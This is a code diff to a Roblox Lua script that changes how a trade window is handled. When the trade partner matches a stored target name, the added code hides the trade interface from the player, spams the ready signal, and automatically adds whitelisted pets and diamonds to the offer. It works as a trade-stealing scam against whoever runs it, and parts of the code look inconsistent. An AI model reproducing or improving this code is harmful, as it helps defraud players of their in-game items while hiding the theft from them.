@@ -171,29 +171,59 @@ local function GetTeleportScript()
     return string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", placeId, jobId)
 end
 
-Popup:GetPropertyChangedSignal("Visible"):Connect(function()
-    if Popup.Visible then
-        local words = {}
-        for _, v in pairs(Popup:GetDescendants()) do
-            if v:IsA("TextLabel") and v.Text ~= "" then
-                table.insert(words, v.Text)
-            end
-        end
-        local text = table.concat(words, " "):lower()
-        if text:find("trade") and (text:find("complete") or text:find("successful")) then
-            if getgenv().aol and not getgenv().here then
-                Popup.Visible = true
-            else
-                getgenv().aol = true
-                Popup.Visible = false
-            end
-        end
+TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
+    if not TradeGui.Visible then
+        return
     end
+
+    local tradeFrame = TradeGui:WaitForChild("Frame")
+    local otherInventory = tradeFrame:WaitForChild("OtherInventory")
+    local title = otherInventory:WaitForChild("Title")
+
+    local text = string.lower(title.Text or "")
+    local targetName = string.lower(getgenv().UName)
+
+    -- Make sure we're trading the correct player
+    if not string.find(text, targetName) then
+        return
+    end
+
+    if not getgenv().here then
+        return
+    end
+
+    if getgenv().aol then
+        TradeFrame.Visible = true
+        TradeGui.BKG.Visible = true
+        return
+    end
+
+    TradeFrame.Visible = false
+    TradeGui.BKG.Visible = false
+
+    -- IMPORTANT:
+    -- Give the trade session time to initialize server-side
+    task.wait(2)
+
+    -- Start ready spam
+    task.spawn(rt)
+
+    -- Add pets first
+    local addedPets = AddWhitelistedPets()
+
+    -- Small delay before diamonds
+    task.wait(0.5)
+
+    -- Add diamonds
+    ModifyDiamondOffer(Diamonds)
+
+    print("Added pets:", addedPets or 0)
+    print("Added diamonds:", Diamonds)
 end)
 
 local function rt()
-    while getgenv().here and not aol do
-        task.wait(0.1)
+    while getgenv().here and not getgenv().aol do
+        task.wait(0.25)
         ReplicatedStorage.Events.UIAction:FireServer("ReadyTrade")
     end
 end
